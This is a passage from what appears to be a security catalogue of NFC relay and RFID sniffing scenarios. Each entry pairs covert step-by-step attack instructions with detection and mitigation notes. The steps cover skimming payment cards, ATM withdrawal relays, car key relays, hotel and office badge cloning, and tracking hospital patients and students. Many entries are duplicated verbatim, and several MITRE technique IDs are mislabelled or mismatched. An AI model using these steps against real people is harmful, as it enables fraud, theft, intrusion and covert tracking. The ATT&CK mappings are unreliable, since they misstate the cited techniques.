- **Attack Steps**: Step 1: Skimmer device is installed under a table in a high-traffic café. Step 2: When a victim places their bag/wallet on the table, the NFC reader reads the card silently. Step 3: Captured NFC signal is relayed in real-time to a Raspberry Pi emulator in attacker’s car. Step 4: Emulator sends the NFC credentials to a test terminal. Step 5: Transaction or access is completed using skimmed credentials.
- **Detection**: Physical device inspection
- **Solution**: Harden POS readers, metal shielding
- **Tags**: NFC, Passive Relay, Café Skimmer

## Multi-Hop NFC Relay in Shopping Mall

- **Attack Type**: NFC Relay Attack
- **Target**: Contactless Credit Card
- **Vulnerability**: No multi-hop detection or proximity validation
- **MITRE**: T1071 (Application Layer Protocols)
- **Impact**: Long-range contactless fraud
- **Tools**: 3 Android Phones, Relay App, POS Device
- **Scenario**: Multiple relay devices form a daisy-chain to pass an NFC signal across floors of a shopping mall.
- **Attack Steps**: Step 1: One phone reads victim’s NFC signal near elevator. Step 2: Second phone relays it to a third phone across the building via mesh Wi-Fi. Step 3: Third phone emulates the signal at a POS terminal. Step 4: POS processes transaction, believing the card is physically nearby. Step 5: Attacker receives unauthorized goods or payment.
- **Detection**: Transaction anomaly detection
- **Solution**: Limit NFC tap range, enforce time-of-flight
- **Tags**: Relay Chain, Mall POS, Multi-Hop

## NFC Hotel Lock Bypass using Clone Card

- **Attack Type**: NFC Relay Attack
- **Target**: Hotel Access Cards
- **Vulnerability**: Static card credentials, lack of replay protection
- **MITRE**: T1003 (Credential Dumping)
- **Impact**: Room invasion, privacy breach
- **Tools**: NFC Reader (Proxmark3), Android Phone, Clone Card
- **Scenario**: Card credentials are captured and cloned via relay to open a hotel room door.
- **Attack Steps**: Step 1: Attacker uses an NFC reader to skim a hotel keycard from victim’s pocket. Step 2: Keycard data is relayed to a second device or card writer. Step 3: Clone card is written with same credentials. Step 4: Attacker uses the cloned card to open victim’s hotel room. Step 5: No alert is triggered due to identical credentials.
- **Detection**: Access control logs, repeated entries
- **Solution**: Use dynamic keys, two-factor entry
- **Tags**: Hotel, NFC Clone, Room Entry

## Tap-to-Pay Bypass with Public Charging Kiosk

- **Attack Type**: NFC Relay Attack
- **Target**: Mobile Wallets
- **Vulnerability**: NFC always-on mode, proximity misuse
- **MITRE**: T1552 (Unsecured Credentials)
- **Impact**: Financial theft, data breach
- **Tools**: Fake Charging Station, NFC Reader, Relay Phone
- **Scenario**: Fake charging kiosk is used to steal tap-to-pay NFC data and relay it for fraudulent use.
- **Attack Steps**: Step 1: Attacker sets up a free public phone charging kiosk. Step 2: Hidden NFC reader under pad reads tap-to-pay credentials from phones. Step 3: NFC data is relayed to attacker’s second phone. Step 4: Second phone emulates the NFC card at a payment terminal. Step 5: Attacker makes unauthorized purchases.
- **Detection**: POS transaction pattern review
- **Solution**: Disable NFC when idle, user alerts
- **Tags**: Charging Station, Mobile Wallet, Tap Fraud

## NFC Access Relay via Smart Glasses

- **Attack Type**: NFC Relay Attack
- **Target**: Corporate Access Badges
- **Vulnerability**: No authentication beyond static token
- **MITRE**: T1071.001
- **Impact**: Facility compromise
- **Tools**: Smart Glasses (AR), NFC Relay App, Remote Emulator
- **Scenario**: Smart glasses secretly relay an NFC badge to bypass building access without physical contact.
- **Attack Steps**: Step 1: Attacker wears smart glasses with NFC reader hidden in frame. Step 2: Walks past employee and captures their NFC badge info. Step 3: Glasses send NFC data via Wi-Fi to a phone/emulator at secure door. Step 4: Emulator sends signal to door lock. Step 5: Door unlocks remotely, granting unauthorized access.
- **Detection**: Badge use audit vs video footage
- **Solution**: Use multi-factor entry systems
- **Tags**: Wearable, NFC Badge, Door Relay

## Fast-Relay via 5G Hotspot Tunnel

- **Attack Type**: NFC Relay Attack
- **Target**: Contactless Cards
- **Vulnerability**: Time-of-flight sensors not enforced
- **MITRE**: T1020 (Automated Exfiltration)
- **Impact**: High-speed financial fraud
- **Tools**: Android Phones, 5G Hotspot, NFC Relay Framework
- **Scenario**: High-speed 5G hotspot is used to reduce relay lag, making detection nearly impossible.
- **Attack Steps**: Step 1: One phone reads NFC card near a user in a cafe. Step 2: Phone connects to a portable 5G hotspot. Step 3: Data is instantly tunneled to another phone in a nearby store. Step 4: Second phone emulates NFC card and completes payment. Step 5: Delay is so low that it evades fraud detection.
- **Detection**: 5G tunneling anomaly detection
- **Solution**: Distance bounding enforcement
- **Tags**: 5G Relay, NFC Tunnel, Low-Latency

## NFC Key Relay to Access Vehicle

- **Attack Type**: NFC Relay Attack
- **Target**: NFC Car Keys
- **Vulnerability**: No distance bounding in keyless entry
- **MITRE**: T1016 (System Network Configuration Discovery)
- **Impact**: Vehicle theft
- **Tools**: Android NFC Phones, Relay Tools, Car Key Signal Sniffer
- **Scenario**: Relay of a car key fob’s NFC signal allows vehicle to be unlocked or started remotely.
- **Attack Steps**: Step 1: Attacker’s phone gets close to car owner in a public place. Step 2: NFC key data is captured and sent to a second phone near car. Step 3: Second phone sends relayed NFC signal to car’s reader. Step 4: Car unlocks and starts without real key nearby. Step 5: Vehicle theft or manipulation occurs.
- **Detection**: Car access log mismatch, GPS alert
- **Solution**: Enable motion + key proximity lock
- **Tags**: NFC Car Relay, Keyless Theft

## Encrypted NFC Badge Relay via Tunnel App

- **Attack Type**: NFC Relay Attack
- **Target**: Encrypted NFC Office Badges
- **Vulnerability**: Proximity trust without challenge-response
- **MITRE**: T1557.002 (Adversary-in-the-Middle)
- **Impact**: Unauthorized access to secure buildings
- **Tools**: 2 Android phones (with NFC), NFC Relay Tunnel App, Wi-Fi/5G
- **Scenario**: An attacker targets a secured office where access badges use encrypted NFC. Despite encryption, the signal is relayed in real-time using a tunnel app without needing decryption.
- **Attack Steps**: Step 1: Attacker installs a specialized tunnel-based NFC relay app (e.g., NFCProxy or custom build) on both Android phones. Step 2: One phone is kept in a bag and is used to get close to the victim's encrypted badge (e.g., while in an elevator or public transport). Step 3: The phone silently reads the encrypted NFC signal; although it can’t decrypt it, it captures the encrypted payload. Step 4: The encrypted signal is forwarded in real-time to the second phone via Wi-Fi or 5G. Step 5: The second phone is held close to the office door’s NFC reader and transmits the same encrypted signal. Step 6: Since the signal is valid and timely, the door authenticates it and grants access. Step 7: The attacker enters the office without ever touching the original badge.
- **Detection**: Access logs vs badge location anomaly
- **Solution**: Implement challenge-response or ephemeral tokens
- **Tags**: Relay, Encrypted NFC, Tunnel App, Physical Access

## NFC Ticket Relay Attack in Stadium Entry

- **Attack Type**: NFC Relay Attack
- **Target**: Digital NFC Event Tickets
- **Vulnerability**: Token reuse without time validation
- **MITRE**: T1600 (Weaken Encryption)
- **Impact**: Ticket fraud, revenue loss
- **Tools**: Android phone with NFC reader, Wi-Fi Hotspot, Second phone with NFC emulator
- **Scenario**: The attacker targets digital NFC event tickets by relaying a legitimate attendee’s signal from outside the stadium to gain free entry.
- **Attack Steps**: Step 1: Attacker identifies a victim standing near the gate who has opened their digital ticket on a phone with NFC enabled. Step 2: Attacker’s phone (Reader A) reads the NFC tag's broadcasted token by standing nearby (within 3–4 cm). Step 3: The signal is sent via hotspot or mobile data to a second phone (Emulator B) placed at another entry gate where there are fewer checks. Step 4: Emulator B emulates the victim’s NFC ticket at the gate. Step 5: The gate accepts the token as genuine and opens. Step 6: The attacker enters the stadium without buying a ticket.
- **Detection**: Entry logs, one-time use analysis
- **Solution**: Use expiring tokens, facial confirmation
- **Tags**: NFC Ticket, Stadium Fraud, Token Relay

## NFC ATM Relay Exploitation

- **Attack Type**: NFC Relay Attack
- **Target**: NFC-enabled Banking Cards
- **Vulnerability**: Contactless ATM interaction with weak validation
- **MITRE**: T1056.001 (Input Capture)
- **Impact**: Financial loss, ATM abuse
- **Tools**: Android NFC Reader Phone, Android Emulator Phone, ATM
- **Scenario**: Attackers abuse modern NFC-enabled ATMs by relaying a banking card signal from a victim to withdraw money.
- **Attack Steps**: Step 1: Attacker carries an NFC reader phone and positions it in a backpack or hand near a user’s wallet at a crowded location. Step 2: Reader captures the NFC payment card data or token. Step 3: The data is sent via 4G or Wi-Fi to a second phone near a vulnerable ATM that supports contactless withdrawal. Step 4: Second phone emulates the NFC card and initiates a withdrawal process at the ATM. Step 5: ATM processes the transaction as if the card is physically present. Step 6: Money is withdrawn before the victim even realizes.
- **Detection**: ATM camera footage, card usage at two locations
- **Solution**: Require PIN + card presence, alert on ATM NFC use
- **Tags**: ATM NFC, Banking Relay, Withdraw Fraud

## NFC Car Key Relay via Backdoor Device

- **Attack Type**: NFC Relay Attack
- **Target**: NFC Key Fobs (Cars)
- **Vulnerability**: No motion or user confirmation required for NFC unlock
- **MITRE**: T1016 (System Network Configuration Discovery)
- **Impact**: Car theft with zero physical contact
- **Tools**: NFC Reader Module, Microcontroller, Wi-Fi Module, Emulator Phone
- **Scenario**: NFC key fob signal is relayed using a stealth device embedded in a parking lot wall, allowing attackers to unlock and drive off with cars.
- **Attack Steps**: Step 1: Attacker embeds a custom NFC reader with a microcontroller and Wi-Fi in a wall or lamp post in a parking area. Step 2: When a person parks their car and walks by, the embedded device scans for any nearby NFC key fobs (e.g., in pockets or bags). Step 3: Captured signal is sent over Wi-Fi to an attacker’s emulator device hidden in the parking lot. Step 4: Emulator sends the relayed signal to the car’s NFC reader. Step 5: Car authenticates and unlocks. Step 6: Attacker drives away with the vehicle.
- **Detection**: Car’s telemetry logs, signal triangulation
- **Solution**: Use motion-based unlock, signal distance limiting
- **Tags**: Vehicle, Parking Relay, NFC Theft

## NFC-Based Door Access Relay via Proxy Laptop

- **Attack Type**: NFC Relay Attack
- **Target**: NFC Door Entry Cards
- **Vulnerability**: Static card ID, no real-time validation
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Building entry breach
- **Tools**: NFC Reader (ACR122U), NFCProxy, Laptop, Emulator Card
- **Scenario**: Relay between a victim’s badge and a door lock is done using a laptop-based proxy tool like NFCProxy, simulating real-time badge authentication.
- **Attack Steps**: Step 1: Attacker sets up a laptop with an ACR122U NFC reader and installs NFCProxy or similar software. Step 2: Victim’s badge is read via the ACR122U reader while they sit at a coffee shop or while walking past attacker. Step 3: NFCProxy captures and logs the data and sends it live via a Wi-Fi tether to a second NFC emulator device. Step 4: The emulator is placed at the entrance of the secure building and replays the signal. Step 5: The door’s NFC reader accepts the token, and the attacker walks in. Step 6: The victim never loses their card or knows it was cloned.
- **Detection**: Access logs, door-side surveillance
- **Solution**: Time-based rotating tokens, badge with screen prompts
- **Tags**: NFCProxy, Laptop Relay, Door Breach

## Sniffing RFID Badge at Office Entry Gate

- **Attack Type**: RFID Sniffing
- **Target**: RFID Access Badge
- **Vulnerability**: Unencrypted communication
- **MITRE**: T1585.001 (Impair Defenses: Network Sniffing)
- **Impact**: Unauthorized access replication
- **Tools**: Proxmark3, RTL-SDR, Antenna, Laptop
- **Scenario**: Attacker uses a concealed reader device to sniff RFID badge communication when a user scans their badge at an office entry gate.
- **Attack Steps**: Step 1: Position yourself near the RFID reader at the office gate during busy hours. Step 2: Carry a bag containing a Proxmark3 or RFID sniffer connected to a small hidden antenna. Step 3: Wait for a legitimate user to scan their RFID badge. Step 4: As the card communicates with the reader, capture the RF signal. Step 5: Save the sniffed raw data to a file for later analysis. Step 6: Analyze the captured data to extract UID and protocol details.
- **Detection**: Monitoring unusual RF activity; spectrum analyzers
- **Solution**: Upgrade to encrypted RFID systems (MIFARE DESFire EV2); use shielding walls
- **Tags**: RFID, Sniffing, Badge Cloning, Office

## Sniffing RFID Card on Public Transport

- **Attack Type**: RFID Sniffing
- **Target**: RFID Transit Card
- **Vulnerability**: Lack of encryption, passive tap
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: User impersonation or cloned card use
- **Tools**: Android NFC-enabled Phone, RFIDler, USB NFC Reader
- **Scenario**: Attacker captures RFID card signals from passengers on public transport by standing nearby with a concealed device.
- **Attack Steps**: Step 1: Use an Android smartphone with NFC snooping app (e.g., NFC Tools or custom sniffing app).Step 2: Enable developer or root access to intercept nearby NFC/RFID scans.Step 3: Stand near passengers tapping cards (typically within 5cm range).Step 4: Record transaction data silently without user interaction.Step 5: Analyze captured information for card ID and system frequency.Step 6: Repeat to gather multiple scans from different cards.
- **Detection**: Physical sweep or electromagnetic spectrum detection
- **Solution**: Use RFID-blocking sleeves for commuters; encrypted tokens
- **Tags**: Public Transport, NFC, Cloning, Surveillance

## Warehouse Inventory Tag Sniffing

- **Attack Type**: RFID Sniffing
- **Target**: RFID Inventory Tags
- **Vulnerability**: Exposed passive UHF tags
- **MITRE**: T1595.002 (Active Scanning: Wireless)
- **Impact**: Competitive surveillance, theft planning
- **Tools**: RFID Sniffer (Impinj, Proxmark), Directional Antenna, Laptop
- **Scenario**: Attacker collects RFID inventory tag data to map stock without access to inventory system.
- **Attack Steps**: Step 1: Enter the range of RFID-tagged pallets (usually 1-5m indoors).Step 2: Use a high-gain directional antenna with sniffer to sweep shelves.Step 3: Tune device to warehouse RFID tag frequency (e.g., UHF 860-960 MHz).Step 4: Log tag IDs and timestamps as reader receives signals.Step 5: Correlate tag IDs with known inventory data (if possible).Step 6: Generate a virtual inventory list without internal access.
- **Detection**: Check RF log patterns, unusual RF noise levels
- **Solution**: Use encrypted tags; restrict external RF leakage
- **Tags**: Inventory, RFID, Espionage, Passive Scan

## Hotel Keycard RFID Sniffing in Lobby

- **Attack Type**: RFID Sniffing
- **Target**: Hotel Keycard
- **Vulnerability**: Weak MIFARE Classic encryption
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Room intrusion, keycard cloning
- **Tools**: Proxmark3 RDV4, Antenna, Portable Battery
- **Scenario**: Attacker sniffs RFID signals from hotel guest keycards near the elevator area or check-in counter.
- **Attack Steps**: Step 1: Set up a portable sniffer near the hotel’s RFID-based elevator pad.Step 2: Wait for guests to scan their keycards for access.Step 3: Sniffer captures RFID transmissions from the cards.Step 4: Extract data and identify unique card ID and room access levels.Step 5: Use software to analyze card type (MIFARE Classic, etc.).Step 6: Clone captured UID to a blank RFID card for access simulation.
- **Detection**: Use logging door readers; physical security audits
- **Solution**: Migrate to high-security RFID tech (MIFARE DESFire EV2)
- **Tags**: Hotel, RFID, Physical Security, Clone

## Skimming RFID Payment Card at Café Counter

- **Attack Type**: RFID Sniffing
- **Target**: RFID Contactless Cards
- **Vulnerability**: No RF shielding, exposed data fields
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Card info leakage or fraud
- **Tools**: NFC-enabled Phone with App, Flipper Zero, Power Bank
- **Scenario**: Attacker uses a mobile scanner to sniff contactless payment cards kept in users' wallets or bags.
- **Attack Steps**: Step 1: Approach targets standing in queues with wallet/bag in rear pockets.Step 2: Hold a phone or device close (within 4cm) pretending to use it.Step 3: Run NFC sniffer app to capture card information (PAN, expiry).Step 4: Record multiple taps from the same device for redundancy.Step 5: Export sniffed data to secure storage for analysis.Step 6: Use data in simulated contactless cloning or to test virtual wallet attacks.
- **Detection**: RF monitoring tools; NFC firewall apps
- **Solution**: Encourage RFID wallets; tokenized payments
- **Tags**: Contactless, NFC, Payment Card, Skimming

## Sniffing Employee Attendance Cards in a Cafeteria

- **Attack Type**: RFID Sniffing
- **Target**: Attendance Card
- **Vulnerability**: No encryption or UID obfuscation
- **MITRE**: T1585.002
- **Impact**: Employee tracking, time fraud
- **Tools**: RFID Reader (Proxmark3), Small Concealed Antenna, Battery Pack
- **Scenario**: Attacker captures RFID data while employees scan their ID cards to mark attendance at a cafeteria terminal.
- **Attack Steps**: Step 1: Carry a shoulder bag with a hidden RFID reader antenna wired to a Proxmark3.Step 2: Stand close to the cafeteria entrance during peak hours.Step 3: Wait until employees begin scanning their attendance RFID cards.Step 4: Automatically capture and log each card’s UID and interaction data as they scan.Step 5: Save all captured signals to a laptop or onboard memory.Step 6: Later analyze this data to check for duplicate or predictable patterns.
- **Detection**: Monitor reader logs; unexpected duplicate UIDs
- **Solution**: Use encrypted RFID cards with rotating IDs
- **Tags**: Workplace, RFID, Identity Sniffing

## Sniffing Library Cards for Unauthorized Book Access

- **Attack Type**: RFID Sniffing
- **Target**: Library RFID Cards
- **Vulnerability**: Plain UID, exposed read logs
- **MITRE**: T1040
- **Impact**: Unauthorized book borrowing
- **Tools**: Flipper Zero, RFID/NFC Sniffer, Mobile Phone
- **Scenario**: An attacker near a self-checkout kiosk captures library card details to later simulate check-outs.
- **Attack Steps**: Step 1: Place a concealed RFID sniffer near the self-checkout RFID reader.Step 2: Wait for users to scan their cards and books.Step 3: Capture both card UID and book tag IDs.Step 4: Record the timestamp and sequence of events.Step 5: Export captured data to a mobile app or analysis tool.Step 6: Use this data to simulate unauthorized borrowing scenarios in the lab.
- **Detection**: Logging duplicate access points
- **Solution**: Use authenticated RFID protocols
- **Tags**: Library, RFID, Access Abuse

## RFID Sniffing at Car Park Entry Gate

- **Attack Type**: RFID Sniffing
- **Target**: Vehicle RFID Tags
- **Vulnerability**: Static UIDs, No replay prevention
- **MITRE**: T1557.001
- **Impact**: Vehicle gate bypass
- **Tools**: Proxmark3, High Gain Antenna, SDR
- **Scenario**: Sniffing RFID cards used to open gated residential or office parking lots to replay access later.
- **Attack Steps**: Step 1: Park nearby the vehicle entry gate of a secured lot.Step 2: Set up the Proxmark3 with directional antenna pointing toward the gate reader.Step 3: Wait for a legitimate car to scan its RFID sticker or card.Step 4: Capture the emitted signal during the transaction.Step 5: Store the signal trace for analysis.Step 6: Use software tools to extract and decode UID and access command.Step 7: Simulate replay using another Proxmark or cloned tag.
- **Detection**: Motion detection; gate logs
- **Solution**: Use rolling code RFID; LPR-based access
- **Tags**: RFID, Parking Lot, Replay Attack

## RFID Medical Wristband Sniffing in Hospitals

- **Attack Type**: RFID Sniffing
- **Target**: Hospital Patient Tags
- **Vulnerability**: Passive unencrypted RFID tags
- **MITRE**: T1589.002
- **Impact**: Patient tracking or impersonation
- **Tools**: Mobile RFID Reader (SkyeModule), Covert Scanner, Android Tablet
- **Scenario**: Attacker walks through hospital corridors capturing RFID wristbands worn by patients.
- **Attack Steps**: Step 1: Walk casually through patient-access areas wearing a bag containing RFID scanning module.Step 2: Pass near beds where RFID wristbands are in range (10-30cm).Step 3: Capture transmitted patient tag data silently.Step 4: Store each UID with a timestamp for correlation.Step 5: Analyze data to map room-patient-tag IDs for surveillance simulation.Step 6: Demonstrate how this data could be used to impersonate or relocate patients in simulated attack.
- **Detection**: Monitor corridor RF levels; tag polling logs
- **Solution**: Use encrypted medical RFID with access control
- **Tags**: Medical, RFID, Privacy

## Sniffing Product RFID Tags in Retail Stores

- **Attack Type**: RFID Sniffing
- **Target**: Retail RFID Tags
- **Vulnerability**: Passive EPC tags exposed
- **MITRE**: T1592.001
- **Impact**: Inventory intelligence leakage
- **Tools**: UHF RFID Reader, Portable Antenna, SDR Software
- **Scenario**: Attacker captures product tag data from shelves to simulate competitor price analysis or inventory mapping.
- **Attack Steps**: Step 1: Enter a store with a concealed UHF RFID reader in a bag.Step 2: Walk through aisles slowly scanning RFID product tags.Step 3: Store scanned tag IDs with approximate location (aisle markers).Step 4: Export data and cross-reference with known product codes.Step 5: Use this to estimate pricing, restock cycles, or compare with another branch.Step 6: Simulate how an attacker can use this for corporate surveillance.
- **Detection**: RF shielding audits; retail scanner logs
- **Solution**: Encrypt product tag data; RFID zoning
- **Tags**: Retail, Espionage, Surveillance

## Metro Card RFID Sniffing While Seated Nearby

- **Attack Type**: RFID Sniffing
- **Target**: Metro Smartcard
- **Vulnerability**: No shielding or card timeout
- **MITRE**: T1040
- **Impact**: Fare fraud, surveillance
- **Tools**: NFC Phone, Sniffing App, Power Bank
- **Scenario**: Attacker sits next to a commuter and sniffs metro card RFID data stored in the bag.
- **Attack Steps**: Step 1: Sit beside a target on the metro with NFC phone enabled.Step 2: Open a background sniffing app that logs NFC activity.Step 3: Keep phone within 2-4cm of their bag pocket.Step 4: Capture any passive card response broadcast by the metro card.Step 5: Store captured tag ID locally and timestamp it.Step 6: Later simulate how this ID might be cloned or used for metro entry.
- **Detection**: Monitor card logs, tap time anomalies
- **Solution**: Use tokenized smartcards, shielding wallets
- **Tags**: Transit, Privacy, Sniffing

## Access Badge Sniffing Through Office Glass

- **Attack Type**: RFID Sniffing
- **Target**: Office ID Badge
- **Vulnerability**: Static tags without timeout
- **MITRE**: T1583.007
- **Impact**: Access cloning, physical intrusion
- **Tools**: Long-range RFID Reader, Proxmark3, USB SDR
- **Scenario**: Attacker positions an RFID reader near office glass walls to capture badges on desks.
- **Attack Steps**: Step 1: From outside a glass-walled office, place a concealed RFID reader facing inward.Step 2: Wait until employees leave their access badges on the desk.Step 3: Activate the reader to poll all badges in range.Step 4: Capture all tag IDs and store them.Step 5: Analyze signal strength to estimate badge location or floor.Step 6: Later replay or clone these badges in lab scenarios.
- **Detection**: EM field monitoring near glass walls
- **Solution**: Use badge lockers; time-expired tags
- **Tags**: RFID, Badge Theft, Remote Sniffing

## Delivery Parcel RFID Tag Sniffing at Loading Dock

- **Attack Type**: RFID Sniffing
- **Target**: RFID Parcel Tags
- **Vulnerability**: EPC Gen2 tags, unencrypted
- **MITRE**: T1591.002
- **Impact**: Customer data or shipment intel
- **Tools**: SDR, UHF Reader, Laptop, Directional Antenna
- **Scenario**: Sniff RFID parcel labels to collect customer or shipment metadata at delivery centers.
- **Attack Steps**: Step 1: Position yourself near the loading dock where parcels are scanned.Step 2: Use a UHF directional reader to scan exposed shipping labels with RFID.Step 3: Log each tag’s EPC code and associate timestamp/location.Step 4: Correlate tags to known tracking systems (mock database).Step 5: Analyze patterns of high-value shipments or customer identity.Step 6: Simulate leakage of customer logistics in training.
- **Detection**: Monitor unknown readers in delivery zones
- **Solution**: Use tamper-resistant RFID; encrypted labels
- **Tags**: Logistics, RFID, Privacy Breach

## Student ID RFID Sniffing in School Hallway

- **Attack Type**: RFID Sniffing
- **Target**: Student RFID ID
- **Vulnerability**: No UID obfuscation, always-on signal
- **MITRE**: T1589.001
- **Impact**: Attendance spoofing, stalking
- **Tools**: NFC Reader (USB), SDR Dongle, Raspberry Pi
- **Scenario**: Capturing RFID UIDs from student cards scanned at classroom doors.
- **Attack Steps**: Step 1: Place a Raspberry Pi with a USB RFID/NFC reader inside a locker or wall near door.Step 2: Power the setup with a portable battery.Step 3: Log every scan of student cards passing by.Step 4: Store timestamped UIDs on SD card.Step 5: After a day, remove device and analyze stored data.Step 6: Use in lab simulation to show tracking, impersonation risks.
- **Detection**: School security audits, RF sweeps
- **Solution**: Use access-limited zones; encrypt tags
- **Tags**: Education, ID Sniffing, Privacy

## Luggage RFID Sniffing in Airports

- **Attack Type**: RFID Sniffing
- **Target**: Baggage Tags
- **Vulnerability**: Static EPCs, publicly visible
- **MITRE**: T1589.003
- **Impact**: Travel profiling, targeted theft
- **Tools**: UHF Reader, Mobile Terminal, Data Logger
- **Scenario**: Attacker captures RFID baggage tag signals to map destination or passenger ID.
- **Attack Steps**: Step 1: Stand or walk near baggage collection or sorting belt.Step 2: Use a portable UHF reader in your bag to scan tags on luggage.Step 3: Record EPC values, timestamp, and gate details.Step 4: Match EPCs to flight database (mocked) in offline tool.Step 5: Show how attacker can use this data to track individuals or plan theft.Step 6: Conduct a controlled classroom replay with fake tags.
- **Detection**: RF sweeps, CCTV surveillance
- **Solution**: Randomize EPCs; encrypted tags
- **Tags**: Airport, Surveillance, RFID

## Sniffing RFID Badge at Office Entry Gate

- **Attack Type**: RFID Sniffing
- **Target**: RFID Access Badge
- **Vulnerability**: Unencrypted communication
- **MITRE**: T1585.001 (Impair Defenses: Network Sniffing)
- **Impact**: Unauthorized access replication
- **Tools**: Proxmark3, RTL-SDR, Antenna, Laptop
- **Scenario**: Attacker uses a concealed reader device to sniff RFID badge communication when a user scans their badge at an office entry gate.
- **Attack Steps**: Step 1: Position yourself near the RFID reader at the office gate during busy hours. Step 2: Carry a bag containing a Proxmark3 or RFID sniffer connected to a small hidden antenna. Step 3: Wait for a legitimate user to scan their RFID badge. Step 4: As the card communicates with the reader, capture the RF signal. Step 5: Save the sniffed raw data to a file for later analysis. Step 6: Analyze the captured data to extract UID and protocol details.
- **Detection**: Monitoring unusual RF activity; spectrum analyzers
- **Solution**: Upgrade to encrypted RFID systems (MIFARE DESFire EV2); use shielding walls
- **Tags**: RFID, Sniffing, Badge Cloning, Office

## Sniffing RFID Card on Public Transport

- **Attack Type**: RFID Sniffing
- **Target**: RFID Transit Card
- **Vulnerability**: Lack of encryption, passive tap
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: User impersonation or cloned card use
- **Tools**: Android NFC-enabled Phone, RFIDler, USB NFC Reader
- **Scenario**: Attacker captures RFID card signals from passengers on public transport by standing nearby with a concealed device.
- **Attack Steps**: Step 1: Use an Android smartphone with NFC snooping app (e.g., NFC Tools or custom sniffing app).Step 2: Enable developer or root access to intercept nearby NFC/RFID scans.Step 3: Stand near passengers tapping cards (typically within 5cm range).Step 4: Record transaction data silently without user interaction.Step 5: Analyze captured information for card ID and system frequency.Step 6: Repeat to gather multiple scans from different cards.
- **Detection**: Physical sweep or electromagnetic spectrum detection
- **Solution**: Use RFID-blocking sleeves for commuters; encrypted tokens
- **Tags**: Public Transport, NFC, Cloning, Surveillance

## Warehouse Inventory Tag Sniffing

- **Attack Type**: RFID Sniffing
- **Target**: RFID Inventory Tags
- **Vulnerability**: Exposed passive UHF tags
- **MITRE**: T1595.002 (Active Scanning: Wireless)
- **Impact**: Competitive surveillance, theft planning
- **Tools**: RFID Sniffer (Impinj, Proxmark), Directional Antenna, Laptop
- **Scenario**: Attacker collects RFID inventory tag data to map stock without access to inventory system.
- **Attack Steps**: Step 1: Enter the range of RFID-tagged pallets (usually 1-5m indoors).Step 2: Use a high-gain directional antenna with sniffer to sweep shelves.Step 3: Tune device to warehouse RFID tag frequency (e.g., UHF 860-960 MHz).Step 4: Log tag IDs and timestamps as reader receives signals.Step 5: Correlate tag IDs with known inventory data (if possible).Step 6: Generate a virtual inventory list without internal access.
- **Detection**: Check RF log patterns, unusual RF noise levels
- **Solution**: Use encrypted tags; restrict external RF leakage
- **Tags**: Inventory, RFID, Espionage, Passive Scan

## Hotel Keycard RFID Sniffing in Lobby

- **Attack Type**: RFID Sniffing
- **Target**: Hotel Keycard
- **Vulnerability**: Weak MIFARE Classic encryption
- **MITRE**: T1557 (Adversary-in-the-Middle)
- **Impact**: Room intrusion, keycard cloning
- **Tools**: Proxmark3 RDV4, Antenna, Portable Battery
- **Scenario**: Attacker sniffs RFID signals from hotel guest keycards near the elevator area or check-in counter.
- **Attack Steps**: Step 1: Set up a portable sniffer near the hotel’s RFID-based elevator pad.Step 2: Wait for guests to scan their keycards for access.Step 3: Sniffer captures RFID transmissions from the cards.Step 4: Extract data and identify unique card ID and room access levels.Step 5: Use software to analyze card type (MIFARE Classic, etc.).Step 6: Clone captured UID to a blank RFID card for access simulation.
- **Detection**: Use logging door readers; physical security audits
- **Solution**: Migrate to high-security RFID tech (MIFARE DESFire EV2)
- **Tags**: Hotel, RFID, Physical Security, Clone

## Skimming RFID Payment Card at Café Counter

- **Attack Type**: RFID Sniffing
- **Target**: RFID Contactless Cards
- **Vulnerability**: No RF shielding, exposed data fields
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Card info leakage or fraud
- **Tools**: NFC-enabled Phone with App, Flipper Zero, Power Bank
- **Scenario**: Attacker uses a mobile scanner to sniff contactless payment cards kept in users' wallets or bags.
- **Attack Steps**: Step 1: Approach targets standing in queues with wallet/bag in rear pockets.Step 2: Hold a phone or device close (within 4cm) pretending to use it.Step 3: Run NFC sniffer app to capture card information (PAN, expiry).Step 4: Record multiple taps from the same device for redundancy.Step 5: Export sniffed data to secure storage for analysis.Step 6: Use data in simulated contactless cloning or to test virtual wallet attacks.
- **Detection**: RF monitoring tools; NFC firewall apps
- **Solution**: Encourage RFID wallets; tokenized payments
- **Tags**: Contactless, NFC, Payment Card, Skimming

## Sniffing Employee Attendance Cards in a Cafeteria

- **Attack Type**: RFID Sniffing
- **Target**: Attendance Card
- **Vulnerability**: No encryption or UID obfuscation
- **MITRE**: T1585.002
- **Impact**: Employee tracking, time fraud
- **Tools**: RFID Reader (Proxmark3), Small Concealed Antenna, Battery Pack
- **Scenario**: Attacker captures RFID data while employees scan their ID cards to mark attendance at a cafeteria terminal.
- **Attack Steps**: Step 1: Carry a shoulder bag with a hidden RFID reader antenna wired to a Proxmark3.Step 2: Stand close to the cafeteria entrance during peak hours.Step 3: Wait until employees begin scanning their attendance RFID cards.Step 4: Automatically capture and log each card’s UID and interaction data as they scan.Step 5: Save all captured signals to a laptop or onboard memory.Step 6: Later analyze this data to check for duplicate or predictable patterns.
- **Detection**: Monitor reader logs; unexpected duplicate UIDs
- **Solution**: Use encrypted RFID cards with rotating IDs
- **Tags**: Workplace, RFID, Identity Sniffing

## Sniffing Library Cards for Unauthorized Book Access

- **Attack Type**: RFID Sniffing
- **Target**: Library RFID Cards
- **Vulnerability**: Plain UID, exposed read logs
- **MITRE**: T1040
- **Impact**: Unauthorized book borrowing
- **Tools**: Flipper Zero, RFID/NFC Sniffer, Mobile Phone
- **Scenario**: An attacker near a self-checkout kiosk captures library card details to later simulate check-outs.
- **Attack Steps**: Step 1: Place a concealed RFID sniffer near the self-checkout RFID reader.Step 2: Wait for users to scan their cards and books.Step 3: Capture both card UID and book tag IDs.Step 4: Record the timestamp and sequence of events.Step 5: Export captured data to a mobile app or analysis tool.Step 6: Use this data to simulate unauthorized borrowing scenarios in the lab.
- **Detection**: Logging duplicate access points
- **Solution**: Use authenticated RFID protocols
- **Tags**: Library, RFID, Access Abuse

## RFID Sniffing at Car Park Entry Gate

- **Attack Type**: RFID Sniffing
- **Target**: Vehicle RFID Tags
- **Vulnerability**: Static UIDs, No replay prevention
- **MITRE**: T1557.001
- **Impact**: Vehicle gate bypass
- **Tools**: Proxmark3, High Gain Antenna, SDR
